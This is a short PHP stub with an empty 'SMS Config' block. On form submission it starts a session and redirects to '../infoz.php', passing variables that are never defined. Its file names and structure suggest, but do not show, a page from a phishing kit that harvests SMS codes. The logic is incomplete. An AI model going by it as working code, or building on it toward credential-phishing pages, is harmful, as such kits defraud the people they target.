<?php 
require_once 'panel.php' ;


// SMS Config Start

if(isset($_POST['submit'])) {

if(!isset($_SESSION)) {
    session_start();
}

        

    header("Location: ../infoz.php?userid={$id}&ue={$ue}");

}
// SMS Config END